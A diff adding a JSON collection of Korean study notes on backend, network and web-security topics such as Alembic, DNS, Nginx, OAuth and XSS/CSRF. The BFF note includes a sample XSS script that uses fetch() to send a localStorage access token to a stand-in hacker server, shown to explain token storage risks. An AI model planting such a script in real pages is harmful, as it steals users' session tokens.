@@ -1,0 +1,288 @@
+[
+  {
+    "slug": "alembic",
+    "title": "Alembic",
+    "category": "backend",
+    "tags": [
+      "python",
+      "데이터베이스"
+    ],
+    "summary": "SQLAlchemy DB 스키마 변경을 버전 관리하는 마이그레이션 도구",
+    "thumbnail": "",
+    "date": "2026-04-04",
+    "updatedAt": "2026-04-04T09:44:41.908Z",
+    "sourcePath": "notes/Alembic.md",
+    "content": "# Alembic\n\n## 뭔가\n- SQLAlchemy랑 같이 쓰는 DB 마이그레이션 도구\n- Git이 코드 변경을 추적하듯, DB 스키마 변경 이력을 관리함\n- 테이블 추가/컬럼 수정 등을 파일로 남겨서 팀원끼리 DB 상태 맞춤\n\n## 기본 명령어\n```bash\nalembic revision --autogenerate -m \"설명\"  # 변경 감지해서 마이그레이션 파일 생성\nalembic upgrade head    # 최신으로 적용\nalembic downgrade -1    # 한 단계 롤백\nalembic current         # 현재 버전 확인\nalembic history         # 전체 이력\n```\n\n## 마이그레이션 파일 구조\n```python\ndef upgrade():\n    op.create_table('user',\n        sa.Column('id', sa.Integer(), primary_key=True),\n        sa.Column('name', sa.String(50)),\n    )\n\ndef downgrade():\n    op.drop_table('user')\n```\n- `upgrade()` : 앞으로 적용\n- `downgrade()` : 되돌리기\n\n## 주의할 점\n- autogenerate가 다 잡아주진 않음 (타입 변경, view 등은 못 감지) → 생성 후 파일 꼭 확인\n- 팀 작업 시 동시에 마이그레이션 만들면 충돌 남 → `alembic merge heads`로 해결\n- DB URL은 환경변수로 분리해서 환경별로 다르게 설정\n\n## 데이터 마이그레이션도 가능\n스키마 변경뿐만 아니라 기존 데이터 변환도 파일 안에서 할 수 있음\n```python\ndef upgrade():\n    op.add_column('user', sa.Column('full_name', sa.String()))\n    op.execute(\"UPDATE user SET full_name = first_name || ' ' || last_name\")\n```",
+    "prev": null,
+    "next": {
+      "slug": "bff",
+      "title": "BFF (Backend For Frontend)"
+    }
+  },
+  {
+    "slug": "bff",
+    "title": "BFF (Backend For Frontend)",
+    "category": "security",
+    "tags": [
+      "인증",
+      "보안",
+      "아키텍처",
+      "sso"
+    ],
+    "summary": "프론트엔드를 위한 백엔드. accessToken을 서버에서 관리하고 브라우저엔 sid만 주는 방식",
+    "thumbnail": "",
+    "date": "2026-04-04",
+    "updatedAt": "2026-04-04T09:44:41.908Z",
+    "sourcePath": "notes/BFF.md",
+    "content": "# BFF (Backend For Frontend)\n\n## BFF란\n프론트엔드를 위한 전용 백엔드 서버\n\n## 왜 쓰나\n\n### accessToken을 브라우저에 저장하면 안 되는 이유\n- JWT라 정보가 다 보임\n- localStorage에 저장하면 XSS 공격으로 털릴 수 있음\n\n### XSS 공격이란\n악성 스크립트를 웹사이트에 심는 공격\n```html\n<script>\n  fetch('https://해커서버.com?token=' + localStorage.getItem('accessToken'))\n</script>\n```\n댓글 같은 입력창에 이걸 심으면 다른 사람 토큰이 해커한테 전송됨\n\n## BFF 방식 흐름\n- accessToken은 서버(BFF)에만 보관\n- 브라우저한테는 sid(세션ID)만 줌\n- sid는 httpOnly 쿠키로 저장 → 자바스크립트로 못 읽음\n- 브라우저가 sid 들고 오면 BFF가 accessToken으로 API 대신 호출\n\n## httpOnly 쿠키란\n- 자바스크립트로 읽기 불가 (`document.cookie`로 안 잡힘)\n- 브라우저가 요청할 때 자동으로 붙여줌\n- XSS 공격으로 털릴 일 없음\n\n## BFF 쓰는 이유 정리\n- accessToken, refreshToken 관리를 서버에서 처리\n- 여러 백엔드 API를 프론트 입장에서 하나처럼 사용\n- 브라우저에 백엔드 API 주소 노출 안 함",
+    "prev": {
+      "slug": "alembic",
+      "title": "Alembic"
+    },
+    "next": {
+      "slug": "dns",
+      "title": "DNS"
+    }
+  },
+  {
+    "slug": "dns",
+    "title": "DNS",
+    "category": "network",
+    "tags": [
+      "네트워크",
+      "dns",
+      "인프라"
+    ],
+    "summary": "도메인 이름을 IP 주소로 변환해주는 시스템",
+    "thumbnail": "",
+    "date": "2026-04-04",
+    "updatedAt": "2026-04-04T09:44:41.908Z",
+    "sourcePath": "notes/DNS.md",
+    "content": "# DNS\n\n## 개념\n- 컴퓨터는 IP로 통신하는데 사람이 외우기 힘드니까 도메인 이름을 씀\n- DNS는 `google.com` 같은 도메인을 `142.250.80.46` 같은 IP로 바꿔주는 전화번호부\n\n## 조회 흐름\n```\n브라우저 입력\n  → 내 컴퓨터 캐시 확인\n  → /etc/hosts 확인\n  → Resolver (ISP or 8.8.8.8) 에게 질문\n      → Root 서버: \".com 담당은 저쪽이야\"\n      → TLD 서버: \"google.com 담당은 저쪽이야\"\n      → Authoritative 서버: \"142.250.80.46 이야\"\n  → IP 반환 → 연결\n```\n\n## 레코드 종류\n\n| 레코드 | 연결 대상 | 언제 씀 |\n|---|---|---|\n| A | 도메인 → IPv4 | 기본 서버 연결 |\n| AAAA | 도메인 → IPv6 | IPv6 지원 |\n| CNAME | 도메인 → 도메인 | 별칭, Vercel/Netlify 같은 외부 서비스 연결 |\n| MX | 메일 서버 지정 | 이메일 수신 |\n| NS | 네임서버 지정 | DNS 정보 어느 서버가 갖고 있는지 |\n| TXT | 텍스트 | 도메인 소유권 인증, 스팸 방지 |\n\n## 캐싱 & TTL\n- 매번 전체 조회하면 느리니까 결과를 캐시에 저장\n- TTL = 캐시 유효 시간 (초 단위), 지나면 다시 조회\n- IP 바꿔도 TTL 지나야 반영됨 → 도메인 이전할 때 TTL 먼저 줄이는 이유\n\n## 실무에서 쓰는 상황\n- **서비스 배포**: 서버 IP 받으면 A 레코드 등록해서 도메인 연결\n- **서브도메인**: `api.myapp.com`, `admin.myapp.com` 각각 다른 서버로 연결\n- **도메인 이전**: 서버 바꿀 때 A 레코드 수정, TTL 때문에 바로 안 바뀜\n- **HTTPS 인증서**: TXT 레코드로 도메인 소유권 증명\n- **메일 설정**: MX 레코드로 메일 서버 지정, TXT로 스팸 방지\n- **CDN**: Cloudflare 붙일 때 NS를 Cloudflare로 위임\n\n## A 레코드 등록하면 끝이 아님\nDNS는 첫 번째 단계일 뿐, 그 뒤에도 필요한 것들:\n```\n도메인 구매\n→ A 레코드 등록 (DNS)\n→ 웹서버 설정 (Nginx 등)\n→ SSL 인증서 발급 (HTTPS)\n→ 포트 오픈 (80, 443)\n→ 끝\n```\n\n## CNAME 패턴\n```\nmyapp.com      →  A      →  123.456.789.0\nwww.myapp.com  →  CNAME  →  myapp.com      # IP 바뀌면 여기도 자동 반영\nmyapp.com      →  CNAME  →  cname.vercel-dns.com  # Vercel 배포 시\n```",
+    "prev": {
+      "slug": "bff",
+      "title": "BFF (Backend For Frontend)"
+    },
+    "next": {
+      "slug": "git-rebase-worktree",
+      "title": "Git rebase & worktree"
+    }
+  },
+  {
+    "slug": "git-rebase-worktree",
+    "title": "Git rebase & worktree",
+    "category": "git",
+    "tags": [
+      "git",
+      "rebase",
+      "worktree"
+    ],
+    "summary": "히스토리 정리와 멀티 브랜치 작업",
+    "thumbnail": "",
+    "date": "2026-04-04",
+    "updatedAt": "2026-04-04T09:44:41.908Z",
+    "sourcePath": "notes/Git-rebase-worktree.md",
+    "content": "# Git rebase & worktree\n\n## rebase\n\n남의 작업(main)이 앞으로 갔을 때, 내 커밋들을 그 끝에 다시 붙이는 것.\n\n```\n전:\nA - B - C          (main)\n     \\\n      D - E        (내 브랜치)\n\n후 (git rebase main):\nA - B - C - D' - E'\n```\n\nD, E가 재작성되어 C 뒤에 붙음 (커밋 해시 바뀜).\n\n### merge랑 차이\n\n결과 코드는 같음. 히스토리 모양이 다름.\n\n- `merge` → 가지 모양, merge commit 생김, 히스토리 보존\n- `rebase` → 일직선, 깔끔하지만 커밋 재작성\n\n### 언제\n\n- PR 올리기 전에 main 최신화할 때 → rebase\n- PR 최종 합칠 때 → merge\n\n### 명령어\n\n```bash\ngit rebase main\n\n# 충돌 나면\ngit rebase --continue\ngit rebase --abort\n\n# 커밋 정리 (최근 3개)\ngit rebase -i HEAD~3\n```\n\n### 주의\n\n이미 push해서 팀이 같이 쓰는 브랜치에선 쓰지 말 것. 혼자 쓰는 브랜치에서만.\n\n---\n\n## worktree\n\n같은 repo를 여러 폴더에서 동시에 열 수 있는 기능. `.git`은 하나인데 브랜치를 따로 체크아웃.\n\n```bash\ngit worktree add ../repo-hotfix hotfix/login-bug\ngit worktree list\ngit worktree remove ../repo-hotfix\n```\n\n각 폴더는 독립. `/repo-hotfix`에서 커밋해도 feature 브랜치랑 관계없음.\n\n### 언제 유용\n\n- 빌드가 무거워서 브랜치 전환 시 캐시 날아가는 게 아까울 때\n- IDE 인덱싱이 브랜치 전환마다 느릴 때\n- 두 브랜치를 나란히 보면서 비교할 때\n\n대부분의 경우는 `git stash` + 브랜치 전환으로 충분함.",
+    "prev": {
+      "slug": "dns",
+      "title": "DNS"
+    },
+    "next": {
+      "slug": "nginx",
+      "title": "Nginx"
+    }
+  },
+  {
+    "slug": "nginx",
+    "title": "Nginx",
+    "category": "network",
+    "tags": [
+      "네트워크",
+      "인프라",
+      "서버"
+    ],
+    "summary": "리버스 프록시 서버. 요청을 받아 적절한 서버로 전달, 로드 밸런싱 담당",
+    "thumbnail": "",
+    "date": "2026-04-04",
+    "updatedAt": "2026-04-04T09:44:41.908Z",
+    "sourcePath": "notes/Nginx.md",
+    "content": "# Nginx\n\n## Nginx란\n요청을 받아서 적절한 서버로 전달해주는 **리버스 프록시** 서버\n\n건물 안내데스크 같은 것 - 방문객(요청)이 오면 어디로 가야할지 안내\n\n## 리버스 프록시\n외부에서 온 요청을 받아서 내부 서버로 전달하는 것\n\n```nginx\nserver {\n    location /login { proxy_pass http://서버A; }\n    location /payment { proxy_pass http://서버B; }\n}\n```\n\n## 로드 밸런싱\n리버스 프록시가 하는 일 중 하나. 서버 여러 개에 요청을 나눠주는 것\n\n```nginx\nupstream myapp {\n    server localhost:3000;\n    server localhost:3001;\n    server localhost:3002;\n}\n```\n\n## 리버스 프록시 vs 로드 밸런싱\n| | 설명 |\n|---|---|\n| 리버스 프록시 | 요청을 대신 받아서 전달 (목적) |\n| 로드 밸런싱 | 여러 서버에 요청을 나눠줌 (방법) |\n\n로드 밸런싱은 리버스 프록시가 하는 일 중 하나\n\n## 언제 필요한가\n- 서버 여러 개 운영할 때 (로드 밸런싱)\n- 여러 서비스를 하나의 도메인으로 묶을 때\n- 작은 프로젝트 혼자 돌릴 땐 없어도 됨",
+    "prev": {
+      "slug": "git-rebase-worktree",
+      "title": "Git rebase & worktree"
+    },
+    "next": {
+      "slug": "oauth-oidc-saml",
+      "title": "OAuth, OIDC, SAML"
+    }
+  },
+  {
+    "slug": "oauth-oidc-saml",
+    "title": "OAuth, OIDC, SAML",
+    "category": "security",
+    "tags": [
+      "인증",
+      "sso",
+      "keycloak",
+      "보안"
+    ],
+    "summary": "SSO 관련 인증/인가 프로토콜 개념 정리",
+    "thumbnail": "",
+    "date": "2026-04-04",
+    "updatedAt": "2026-04-04T09:44:41.909Z",
+    "sourcePath": "notes/OAuth-OIDC-SAML.md",
+    "content": "# OAuth, OIDC, SAML\n\n## OAuth\n\"이 앱이 내 정보 써도 돼?\" 허락을 받는 규칙\n\n- 로그인이 아님, 정보 접근 허락만\n- 예: 카카오 정보 제공 동의\n\n## OIDC\nOAuth + \"이 사람이 누구인지\" 확인 → 로그인\n\n- OAuth 위에 신원 확인 기능을 얹은 것\n- \"카카오로 로그인\"이 실제로는 OIDC\n- 가볍고 현대적, JSON 기반\n\n## SAML\n기업 내부 시스템용 인증 프로토콜\n\n- XML 기반이라 무겁고 복잡\n- 레거시 시스템 연동에 많이 씀\n- 지금 프로젝트는 OIDC 사용 중\n\n## Keycloak OIDC 로그인 흐름 (Authorization Code Flow)\n\n1. 브라우저 → Keycloak \"로그인할게\"\n2. Keycloak → 브라우저 \"로그인 됐어, 여기 code\" (URL 콜백)\n3. 브라우저 → 서버 \"나 이 code 받았어\"\n4. 서버 → Keycloak \"이 code로 토큰 줘\"\n5. Keycloak → 서버 \"여기 JWT 토큰\"\n6. 서버 → 브라우저 \"로그인 완료\"\n\n## 프로비저닝\nSSO 로그인 후 해당 서비스에 유저가 없을 때 자동으로 계정을 만들어주는 것\n\n흐름:\n1. SSO 로그인 → sid 발급\n2. Roundcube 같은 서비스 접속\n3. 해당 유저 있나 확인\n4. 없으면 → sid로 Keycloak에서 유저 정보 가져와서 자동 계정 생성\n5. 있으면 → 그냥 로그인\n\n## 왜 토큰을 바로 안 주고 code를 먼저 주나\n- 콜백이 브라우저 URL로 오는데 URL은 누구나 볼 수 있음\n- 토큰을 URL에 직접 주면 노출 위험\n- code는 임시 교환권, 서버가 code로 Keycloak한테 직접 토큰 요청\n- 토큰은 서버 ↔ Keycloak 사이에서만 교환 (브라우저 안 거침)",
+    "prev": {
+      "slug": "nginx",
+      "title": "Nginx"
+    },
+    "next": {
+      "slug": "proxy",
+      "title": "Proxy"
+    }
+  },
+  {
+    "slug": "proxy",
+    "title": "Proxy",
+    "category": "network",
+    "tags": [
+      "네트워크",
+      "프록시",
+      "cors"
+    ],
+    "summary": "프록시와 리버스 프록시 차이, CORS에서 프록시를 쓰는 이유",
+    "thumbnail": "",
+    "date": "2026-04-04",
+    "updatedAt": "2026-04-04T09:44:41.909Z",
+    "sourcePath": "notes/Proxy.md",
+    "content": "# Proxy\n\n## 프록시란\n클라이언트와 서버 사이의 중간다리\n\n## 프록시 vs 리버스 프록시\n\n```\n프록시:         클라이언트 → [프록시] → 서버\n리버스 프록시:  클라이언트 → [리버스 프록시] → 서버\n```\n\n- **프록시** = 클라이언트 앞에 위치, 클라이언트 대리 (\"내 대신 나가줘\")\n- **리버스 프록시** = 서버 앞에 위치, 서버 대리 (\"내 대신 받아줘\")\n\n## 리버스 프록시 쓰는 이유\n- 보안: 백엔드 직접 노출 안 함\n- 인증/인가 중앙화: 토큰 검증, 권한 체크 한 곳에서\n- 라우팅: `/api/hr/*` → HR 서비스, `/api/dmp/*` → DMP 서비스\n- 공통 기능: 로깅, 레이트리밋, CORS, 헤더 정리\n- 확장성: 로드밸런싱, 캐시, 장애 격리\n\n## 실제 사용 예시\n- **프록시** → Next.js에서 CORS 해결할 때\n- **리버스 프록시** → Nginx\n\n## CORS 해결에 프록시를 쓰는 이유\n- CORS는 브라우저가 막는 규칙\n- 브라우저 → 같은 도메인 프록시 서버 (CORS 안 걸림)\n- 프록시 서버 → 다른 도메인 서버 (서버끼리는 CORS 없음)\n\n## 관련 개념\n- upstream/downstream/hop은 `Upstream-Downstream-Hop.md`에 정리",
+    "prev": {
+      "slug": "oauth-oidc-saml",
+      "title": "OAuth, OIDC, SAML"
+    },
+    "next": {
+      "slug": "sandbox",
+      "title": "Sandbox"
+    }
+  },
+  {
+    "slug": "sandbox",
+    "title": "Sandbox",
+    "category": "devops",
+    "tags": [
+      "개발환경",
+      "보안",
+      "테스트"
+    ],
+    "summary": "코드를 실제 환경과 분리해서 안전하게 실행하는 격리 공간",
+    "thumbnail": "",
+    "date": "2026-04-04",
+    "updatedAt": "2026-04-04T09:44:41.909Z",
+    "sourcePath": "notes/Sandbox.md",
+    "content": "# Sandbox\n\n## 개념\n- sandbox는 코드를 내 컴퓨터 전체에 바로 영향 주지 않게, 제한된 공간에서 실행하는 방식\n- 실험하다가 문제가 나도 바깥 환경에 영향이 적음\n- 개발에서는 Docker, VM, 온라인 실행기 같은 형태로 자주 씀\n\n## 비교\n| | git clone | sandbox |\n|---|---|---|\n| 의미 | 코드 복사 | 실행 환경 격리 |\n| 목적 | 프로젝트 가져오기 | 안전한 실행/테스트 |\n| 효과 | 폴더는 분리됨 | 권한/파일/네트워크까지 제한 가능 |\n| 같이 쓰는지 | 단독 사용 가능 | clone 후 같이 쓰면 더 안전 |",
+    "prev": {
+      "slug": "proxy",
+      "title": "Proxy"
+    },
+    "next": {
+      "slug": "server-deploy-setup",
+      "title": "서버 배포 구성"
+    }
+  },
+  {
+    "slug": "server-deploy-setup",
+    "title": "서버 배포 구성",
+    "category": "infra",
+    "tags": [
+      "nginx",
+      "dns",
+      "ssl",
+      "docker"
+    ],
+    "summary": "nginx, DNS, SSL, Docker 포트 관리 등 서비스 배포에 필요한 개념 정리",
+    "thumbnail": "",
+    "date": "2026-04-04",
+    "updatedAt": "2026-04-04T09:44:57.356Z",
+    "sourcePath": "notes/서버-배포-구성.md",
+    "content": "# 서버 배포 구성\n\n## DNS\n- **A 레코드**: 도메인 → IP 직접 연결\n- **CNAME**: 도메인 → 다른 도메인 (iptime DDNS 쓸 때)\n- 서브도메인은 각각 등록해야 함 (`mail`, `talk` 별개)\n- 확인: `dig talk.datco-sb.kr`\n\n## nginx\n\n### sites-available vs sites-enabled\n- `sites-available/` = 설정 파일 보관\n- `sites-enabled/` = 심볼릭 링크로 활성화된 것만\n- 끄고 싶으면 링크만 삭제, 파일은 보존\n\n```bash\n# 활성화\nsudo ln -s /etc/nginx/sites-available/talk.conf /etc/nginx/sites-enabled/\n# 비활성화\nsudo rm /etc/nginx/sites-enabled/talk.conf\n```\n\n### 리버스 프록시\n- nginx가 **도메인(Host 헤더)**으로 요청을 구분해서 내부 서비스로 분배\n- 외부 포트(80/443)는 하나의 nginx가 잡고, 도메인별로 다른 `proxy_pass`\n\n```nginx\nserver {\n    server_name talk.datco-sb.kr;\n    location / {\n        proxy_pass http://localhost:9006;\n    }\n}\n```\n\n- Mattermost처럼 WebSocket 쓰는 서비스는 `Upgrade`, `Connection` 헤더 필요\n\n## SSL (certbot / Let's Encrypt)\n- webroot 방식: `sudo certbot certonly --webroot -w /var/www/_letsencrypt -d 도메인`\n- nginx 설정에 아직 없는 인증서 경로를 참조하면 에러남 → **443 블록 주석 처리 → 발급 → 해제**\n- 90일 유효, 자동 갱신\n\n## Docker 포트\n- 같은 서버에서 두 프로세스가 같은 포트를 동시에 쓸 수 없음\n- 컨테이너 내부는 같아도 호스트 노출 포트는 달라야 함: `9006:9005`\n- `docker-compose.override.yml`은 포트를 **교체가 아니라 추가**함 → 포트 변경 용도로 부적합\n- 환경변수 방식이 나음: `${WEBAPP_PORT:-9005}:9005` + `.env`에서 관리\n\n## 요청 흐름\n\n```\n사용자 → talk.datco-sb.kr (443)\n  → 공유기 (포트포워딩)\n    → 서버 nginx (도메인으로 판단)\n      → localhost:9006 (Docker 컨테이너)\n```",
+    "prev": {
+      "slug": "sandbox",
+      "title": "Sandbox"
+    },
+    "next": {
+      "slug": "tcp-udp",
+      "title": "TCP와 UDP"
+    }
+  },
+  {
+    "slug": "tcp-udp",
+    "title": "TCP와 UDP",
+    "category": "network",
+    "tags": [
+      "네트워크",
+      "프로토콜"
+    ],
+    "summary": "데이터 전송 프로토콜. TCP는 수신 확인, UDP는 확인 없이 빠르게",
+    "thumbnail": "",
+    "date": "2026-04-04",
+    "updatedAt": "2026-04-04T09:44:56.882Z",
+    "sourcePath": "notes/TCP와-UDP.md",
+    "content": "# TCP와 UDP\n\n## Protocol 이란\n컴퓨터끼리 소통하는 규칙\n\n## TCP란\n- Transmission Control Protocol\n- 데이터 보내고 \"잘 받았어?\" 확인하는 규칙\n- 확인 못 받으면 다시 보냄\n- 카톡으로 치면 읽음 확인 같은 것\n- 정확성이 중요할 때 사용 (파일 전송, 웹페이지)\n\n## UDP란\n- 그냥 보내고 끝, 확인 안 함\n- 빠른 게 중요할 때 사용 (유튜브, 게임, 전화)\n\n## TCP vs UDP\n| | TCP | UDP |\n|---|---|---|\n| 확인 | 잘 받았는지 확인 | 확인 안 함 |\n| 속도 | 느림 | 빠름 |\n| 사용 | 파일 전송, 웹 | 영상, 게임 |",
+    "prev": {
+      "slug": "server-deploy-setup",
+      "title": "서버 배포 구성"
+    },
+    "next": {
+      "slug": "upstream-downstream-hop",
+      "title": "Upstream-Downstream-Hop"
+    }
+  },
+  {
+    "slug": "upstream-downstream-hop",
+    "title": "Upstream-Downstream-Hop",
+    "category": "network",
+    "tags": [
+      "네트워크",
+      "프록시",
+      "upstream",
+      "downstream",
+      "hop"
+    ],
+    "summary": "프록시/네트워크 흐름에서 upstream, downstream, hop 의미",
+    "thumbnail": "",
+    "date": "2026-04-04",
+    "updatedAt": "2026-04-04T09:44:41.909Z",
+    "sourcePath": "notes/Upstream-Downstream-Hop.md",
+    "content": "# Upstream-Downstream-Hop\n\n## 개념\n- upstream: 내 기준에서 요청을 넘기는 다음 단계\n- downstream: 내 기준에서 요청을 보내온 이전 단계\n- hop: 라우터/프록시 같은 경유지 1개를 지나는 한 단계\n\n## 비교\n| | upstream | downstream |\n|---|---|---|\n| 기준 | 내 다음 단계 | 내 이전 단계 |\n| 예시 (A -> B -> C -> 서버, B 기준) | C | A |\n\n## 예시\n- A -> B -> C -> 서버\n- B 입장: upstream은 C, downstream은 A\n- hop은 경유지 하나당 1 증가",
+    "prev": {
+      "slug": "tcp-udp",
+      "title": "TCP와 UDP"
+    },
+    "next": {
+      "slug": "xss-csrf",
+      "title": "XSS와 CSRF"
+    }
+  },
+  {
+    "slug": "xss-csrf",
+    "title": "XSS와 CSRF",
+    "category": "security",
+    "tags": [
+      "보안",
+      "인증",
+      "쿠키",
+      "bff"
+    ],
+    "summary": "웹 보안 공격 두 가지. XSS는 쿠키를 읽는 공격, CSRF는 쿠키를 사용하는 공격",
+    "thumbnail": "",
+    "date": "2026-04-04",
+    "updatedAt": "2026-04-04T09:44:41.910Z",
+    "sourcePath": "notes/XSS-CSRF.md",
+    "content": "# XSS와 CSRF\n\n## XSS (Cross-Site Scripting)\n악성 스크립트를 웹사이트에 심어서 쿠키/토큰을 **읽는** 공격\n\n### 해결\n- httpOnly 쿠키 → JS로 읽기 불가 → XSS 막힘\n\n## CSRF (Cross-Site Request Forgery)\n사용자 모르게 요청을 위조하는 공격. 쿠키를 **사용하는** 공격\n\n- 로그인된 상태에서 해커 링크 클릭\n- 해커가 만든 페이지가 몰래 요청 보냄\n- 브라우저가 쿠키 자동으로 붙여주니까 서버 입장에선 정상 요청처럼 보임\n- httpOnly로는 못 막음 (JS로 읽는 게 아니라 브라우저가 자동으로 붙이는 거라)\n- GET보다 POST/PUT/DELETE에서 위험 (데이터 변경이 일어나니까)\n\n### 해결 방법 1 - CSRF 토큰\n서버가 랜덤 토큰 발급 → 요청할 때 헤더에 담아서 전송 → 서버가 검증\n해커는 토큰을 모르니까 위조 요청 못 만듦\n\n### 해결 방법 2 - SameSite 쿠키\n- `SameSite=Strict` - 다른 사이트에서 쿠키 완전 차단\n- `SameSite=Lax` - GET은 허용, POST/PUT/DELETE는 다른 사이트에서 차단 → 실무에서 충분한 수준\n- `SameSite=None` - 모두 허용 → CSRF 취약\n\n## XSS vs CSRF\n| | XSS | CSRF |\n|---|---|---|\n| 공격 방식 | 쿠키를 읽음 | 쿠키를 사용함 |\n| 해결 | httpOnly 쿠키 | CSRF 토큰 or SameSite=Lax |",
+    "prev": {
+      "slug": "upstream-downstream-hop",
+      "title": "Upstream-Downstream-Hop"
+    },
+    "next": null
+  }
+]
